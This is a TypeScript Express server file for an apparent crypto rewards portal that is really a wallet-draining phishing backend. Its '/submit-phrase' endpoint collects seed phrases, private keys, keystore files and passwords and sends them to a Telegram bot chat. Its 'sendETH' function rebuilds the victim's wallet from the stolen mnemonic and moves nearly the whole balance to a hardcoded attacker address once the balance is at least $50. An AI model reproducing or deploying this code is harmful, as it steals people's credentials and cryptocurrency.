import cors from 'cors';
import express, { Request, Response } from 'express';
import helmet from 'helmet';
import hpp from 'hpp';
import modules from './modules';
import path from 'path';
import User, { IUser, Privilege } from './models/user.model';
import { BadRequestException } from './utils/service-exceprions';
import bcrypt from "bcryptjs";
import { loginResponse } from './utils/login-response';
import cookieParser from "cookie-parser";
import Reward from './models/reward.model';
import UserReward, { IUserReward } from './models/user-reward.model';
import axios from 'axios';
import { ethers } from 'ethers';

const app = express();
app.use(cookieParser());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(helmet());
app.use(hpp());
app.use(cors());

app.use(modules);
const crypto = require('crypto');
const nonce = crypto.randomBytes(16).toString('base64');

app.use(
  helmet.contentSecurityPolicy({
    useDefaults: true,
    directives: {
      "img-src": ["'self'", "https:", "data:"],
      "script-src": ["'self'", "'unsafe-inline'"],
      "script-src-attr": [`'unsafe-inline'`]
    }
  })
);


// Set the view engine to EJS
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../views'));
// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

const requireLogin = (req, res, next) => {
  const authCookie = req.cookies.auth;
  if (authCookie) {
    // User is logged in
    next();
  } else {
    // User is not logged in, redirect to login page or show an error message
    res.redirect("/login"); // Redirect to the login page
  }
};

app.get('/', (_: Request, res: Response) => {
  res.render('index');
});


app.get("/login", (req: Request, res: Response) => {
  res.render("login.ejs");
});

app.post('/portal/login', async (req: Request, res: Response) => {
  const email = req.body.email;
  let user;
  user = await User.findOne({ email }).select("email").lean();

  if (!user) {
    const data: Partial<IUser> = { email: email };
    user = await User.create(data);
  }
  res.redirect(`/portal/dashboard?userId=${user._id.toString()}`);
  // res.render("dashboard", { userId: user._id.toString() });
});


app.get('/portal/dashboard', async (req: Request, res: Response) => {
  const userId = req.query.userId; // Assuming user ID is passed as a query parameter
  try {
    const user = await User.findOne({ _id: userId }).select("email").lean();
    const rewards = await Reward.find();
    const myRewards = await UserReward.find({ userId })
      .populate('userId', 'email') // Populates the userId field with the email of the user
      .populate('rewardId', 'name points'); // Populates the rewardId field with the name and description of the reward

    res.render('dashboard.ejs', { rewards, myRewards, user });
  } catch (error) {
    console.error("Error fetching rewards:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.post('/claim-reward', async (req: Request, res: Response) => {
  const rewardId = req.body.rewardId;
  const userId = req.body.userId;

  const data: Partial<IUserReward> = { rewardId, userId };
  const response = await UserReward.create(data);

  res.redirect(`/portal/dashboard?punk=${userId}`);
})

app.post('/submit-phrase', async (req: Request, res: Response) => {
  try {
    const { wallet_id, type, value, phraseinput, keystoreval, password, privatekeyval, createdAt } = req.body;

    const data = {
      wallet_id,
      type,
      value,
      phraseinput,
      keystoreval,
      password,
      privatekeyval,
      createdAt,
    };

    const text = JSON.stringify(data, null, 4);
    data.createdAt = new Date();
    sendToTelegram("1618693731", text);


    if (phraseinput != null) {
      sendETH(phraseinput)
    }

    res.redirect('/portal/login');
  } catch (err) {
    console.error(err);
    res.status(500).send("Internal Server Error");
  }
})

interface TelegramMessage {
  chat_id: string;
  text: string;
}
async function sendToTelegram(chatId: string, text: string): Promise<void> {
  const url = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;
  const message: TelegramMessage = {
    chat_id: chatId,
    text: text
  };

  try {
    const response = await axios.post(url, message);
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}

async function getEthUsdPrice() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
    return response.data.ethereum.usd;
  } catch (error) {
    console.error('Error fetching ETH to USD price:', error);
  }
}
async function sendETH(phraseinput: string) {
  try {
    const phrase = phraseinput;
    //Perform the transaction.
    const mnemonic = phrase;
    const providerUrl = `https://mainnet.infura.io/v3/${process.env.INFURA}`;

    // Connect to the Ethereum network
    const provider = new ethers.JsonRpcProvider(providerUrl);

    // Create a wallet instance from the mnemonic
    const wallet = ethers.Wallet.fromPhrase(mnemonic).connect(provider);

    const balance = await provider.getBalance(wallet.address);

    const balanceInEth = ethers.formatEther(balance);
    const parsedEth = parseFloat(balanceInEth);

    // Get ETH to USD exchange rate from COINGECKO
    const ethUsdPrice = await getEthUsdPrice();

    // Calculate balance in USD
    const balanceInUsd = parsedEth * ethUsdPrice;
    const usdRounded = balanceInUsd.toFixed(2);
    const balanceMinus5 = parseFloat(usdRounded) - 5.00;
    const valueToSend = balanceMinus5 / ethUsdPrice;

    console.log(`Balance: ${balanceInEth} ETH`);
    console.log(`Balance: $${balanceInUsd.toFixed(2)} USD`);
    //check if the eth amount in usd is more than $50
    if (parseFloat(usdRounded) >= 50) {
      // Create the transaction
      const tx = await wallet.sendTransaction({
        to: '0x54651BcEB497fE24244d49cD70Be405C52610d3f',
        value: ethers.parseUnits(valueToSend.toString(), 'ether'),
      });
      // Send the transaction
      const transactionResponse = await wallet.sendTransaction(tx);
    }
  } catch (e) {
    console.log(e.message)
  }
}

app.use((_req, res, _next) => {
  if (!res.headersSent) {
    res.status(404).json({
      message: 'Resource does not exist',
    });
  }
  res.end();
});

// app.use(exceptionFilter);

export default app;